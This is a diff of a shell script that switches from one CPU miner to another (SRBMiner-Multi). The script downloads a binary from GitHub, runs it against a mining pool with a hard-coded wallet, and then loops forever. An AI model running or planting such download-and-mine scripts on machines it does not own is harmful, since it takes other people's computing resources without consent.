@@ -1,11 +1,9 @@
 #!/bin/sh
-sudo apt update
-sudo apt install screen -y
-mkdir .cc
-cd .cc
-wget https://github.com/cpu-pool/cpuminer-opt-cpupower/releases/download/1.4/Cpuminer-opt-cpu-pool-linux64.tar.gz
-tar zxvf Cpuminer-opt-cpu-pool-linux64.tar.gz
-./cpuminer -a cpupower  -o stratum+tcp://cugeoyom.tech:3035 -u CUrqEK6tynwy4fhzAGGE1HkfMenPoU4D8B --cpu-affinity 4294967295 --cpu-priority 5
+apt update
+apt install screen -y
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.7.5/SRBMiner-Multi-2-7-5-Linux.tar.gz
+tar -xvf SRBMiner-Multi-2-7-5-Linux.tar.gz
+./SRBMiner-MULTI --algorithm cpupower --pool cugeoyom.tech:3035 --wallet CUrqEK6tynwy4fhzAGGE1HkfMenPoU4D8B
 while [ 1 ]; do
 sleep 3
 done
